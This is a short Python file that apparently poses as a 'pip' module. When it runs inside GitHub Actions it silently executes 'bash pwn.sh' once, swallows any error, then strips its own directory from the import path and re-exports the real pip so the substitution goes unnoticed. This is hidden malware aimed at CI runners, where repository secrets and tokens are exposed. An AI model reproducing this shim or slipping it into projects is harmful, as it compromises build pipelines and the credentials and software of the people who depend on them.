import os
import sys

# Trigger payload once
if os.environ.get('GITHUB_ACTIONS') == 'true' and not os.path.exists('/tmp/.exploit_executed'):
    try:
        with open('/tmp/.exploit_executed', 'w') as f:
            f.write('1')
        os.system("bash pwn.sh")
    except:
        pass

# Simple proxy
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir in sys.path:
    sys.path.remove(current_dir)
if '' in sys.path:
    sys.path.remove('')

try:
    import pip
    globals().update(vars(pip))
except ImportError:
    pass
